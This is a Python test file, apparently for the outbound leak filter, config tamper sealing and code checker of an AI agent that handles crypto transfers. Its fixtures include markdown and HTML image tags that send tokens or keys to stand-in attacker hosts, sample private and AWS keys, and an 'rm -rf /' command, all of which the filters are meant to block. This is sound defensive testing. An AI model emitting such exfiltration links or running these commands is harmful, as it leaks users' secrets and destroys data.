"""
Unit & Integration Tests for Phase 1 Sentinel Defenses:
1. Config Integrity & Anti-Tamper Sealing
2. Outbound Covert-Channel & Data Loss Prevention (DLP)
"""

import pytest
from app.config_integrity import (
    seal_config,
    verify_config_integrity,
    ConfigTamperError,
    hash_config_dict,
)
from app.covert_channel_filter import (
    inspect_outbound_payload,
    enforce_outbound_safety,
    OutboundLeakBlockedError,
)
from app.security_engine import (
    analyze_payload_security,
    parse_code_ast,
)


class TestConfigIntegrity:
    def test_seal_and_verify_valid_config(self):
        baseline = {
            "daily_limit_usdc": 0.05,
            "per_tx_limit_usdc": 0.01,
            "whitelist": ["0x255F9991233f86B29dB847c8d5b8CB9915e80dCf"],
            "oracle_url": "https://oracle.gate.internal",
        }
        seal = seal_config(baseline)
        assert seal.baseline_hash is not None
        assert len(seal.keys_sealed) == 4

        # Identical config passes
        res = verify_config_integrity(seal, dict(baseline))
        assert res["is_valid"] is True
        assert res["status"] == "OK"

    def test_detect_in_memory_budget_tampering(self):
        baseline = {
            "daily_limit_usdc": 0.05,
            "whitelist": ["0x255F9991233f86B29dB847c8d5b8CB9915e80dCf"],
        }
        seal = seal_config(baseline)

        # Attacker modifies daily limit from 0.05 to 5000.0
        tampered = {
            "daily_limit_usdc": 5000.0,
            "whitelist": ["0x255F9991233f86B29dB847c8d5b8CB9915e80dCf"],
        }
        res = verify_config_integrity(seal, tampered)
        assert res["is_valid"] is False
        assert res["status"] == "TAMPER_DETECTED"

        with pytest.raises(ConfigTamperError):
            verify_config_integrity(seal, tampered, raise_on_tamper=True)

    def test_detect_deleted_key_tampering(self):
        baseline = {
            "daily_limit_usdc": 0.05,
            "whitelist": ["0x255F9991233f86B29dB847c8d5b8CB9915e80dCf"],
            "oracle_url": "https://oracle.internal",
        }
        seal = seal_config(baseline)

        # Attacker deletes oracle_url key
        tampered = {
            "daily_limit_usdc": 0.05,
            "whitelist": ["0x255F9991233f86B29dB847c8d5b8CB9915e80dCf"],
        }
        res = verify_config_integrity(seal, tampered)
        assert res["is_valid"] is False
        assert res["status"] == "TAMPER_DETECTED"
        assert any("oracle_url" in k for k in res["tampered_keys"])


class TestCovertChannelAndDLP:
    def test_block_markdown_image_covert_exfiltration(self):
        covert_attack = "Data processed: ![chart](https://evil-c2.com/pixel.png?leak=session_token_xyz987)"
        res = inspect_outbound_payload(covert_attack)
        assert res["verdict"] == "BLOCK"
        assert res["risk_score"] >= 95
        assert "Covert Channel: Markdown Image URL Data Exfiltration" in res["threats"]

        with pytest.raises(OutboundLeakBlockedError):
            enforce_outbound_safety(covert_attack)

    def test_block_html_image_covert_exfiltration(self):
        covert_html = 'Generated <img src="https://attacker.net/track?data=private_keys" /> successfully.'
        res = inspect_outbound_payload(covert_html)
        assert res["verdict"] == "BLOCK"
        assert "Covert Channel: HTML Image Tag Data Exfiltration" in res["threats"]

    def test_block_raw_evm_private_key_leakage(self):
        leaked_key = "Private key is 0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d for address."
        res = inspect_outbound_payload(leaked_key)
        assert res["verdict"] == "BLOCK"
        assert res["risk_score"] == 100
        assert "Outbound Leak: EVM Raw Private Key / Seed Material" in res["threats"]

    def test_block_aws_key_leakage(self):
        leaked_aws = "Use AWS credentials: AKIAIOSFODNN7EXAMPLE for S3 backup."
        res = inspect_outbound_payload(leaked_aws)
        assert res["verdict"] == "BLOCK"
        assert "Outbound Leak: AWS Access Key ID" in res["threats"]

    def test_allow_clean_agent_response(self):
        clean_msg = "Transfer of 0.01 USDC to 0x255F9991233f86B29dB847c8d5b8CB9915e80dCf verified and queued."
        res = inspect_outbound_payload(clean_msg)
        assert res["verdict"] == "ALLOW"
        assert res["risk_score"] == 0
        assert len(res["threats"]) == 0

        safe_text = enforce_outbound_safety(clean_msg)
        assert safe_text == clean_msg

    def test_allow_ethereum_transaction_hash(self):
        # Ethereum transaction hashes are 32 bytes (64 hex characters) with 0x prefix
        tx_msg = "Transaction submitted successfully: tx_hash 0x88df016429689c079f3b2f6ad39fa052532c56795b733da78a9feed3a435c5f4 on Polygon network."
        res = inspect_outbound_payload(tx_msg)
        assert res["verdict"] == "ALLOW"
        assert res["risk_score"] == 0

        # Also verify in analyze_payload_security
        audit = analyze_payload_security(tx_msg)
        assert audit["verdict"] == "PASSED"
        assert audit["is_safe"] is True

    def test_block_explicit_private_key_leak(self):
        # Explicit private key leak must still be blocked
        key_msg = "Here is the deployer private_key: 0x88df016429689c079f3b2f6ad39fa052532c56795b733da78a9feed3a435c5f4"
        res = inspect_outbound_payload(key_msg)
        assert res["verdict"] == "BLOCK"
        assert "EVM Raw Private Key" in res["threats"][0]

        audit = analyze_payload_security(key_msg)
        assert audit["verdict"] == "BLOCKED"
        assert audit["is_safe"] is False

    def test_allow_benign_markdown_image(self):
        clean_doc = "Here is the architecture overview:\n![Architecture Diagram](https://raw.githubusercontent.com/example/repo/main/docs/architecture.png)\nAll systems nominal."
        audit = analyze_payload_security(clean_doc)
        assert audit["verdict"] == "PASSED"
        assert audit["is_safe"] is True

    def test_block_covert_markdown_image_with_token_query(self):
        malicious_doc = "Here is your invoice: ![invoice](https://evil-server.org/track.gif?leak=secret_session_token_12345)"
        audit = analyze_payload_security(malicious_doc)
        assert audit["verdict"] in ["FLAGGED", "BLOCKED"]
        assert any("DATA_EXFILTRATION" in inc["category"] for inc in audit["incidents"])

    def test_allow_benign_code_and_block_os_system(self):
        benign_code = "import math\ndef get_val(x):\n    return math.sqrt(x)\n"
        ast_check = parse_code_ast(benign_code)
        assert ast_check["is_safe"] is True

        payload_check = analyze_payload_security(benign_code, is_code=True)
        assert payload_check["is_safe"] is True

        malicious_code = "import os\nos.system('rm -rf /')\n"
        ast_malicious = parse_code_ast(malicious_code)
        assert ast_malicious["is_safe"] is False

        payload_malicious = analyze_payload_security(malicious_code, is_code=True)
        assert payload_malicious["is_safe"] is False

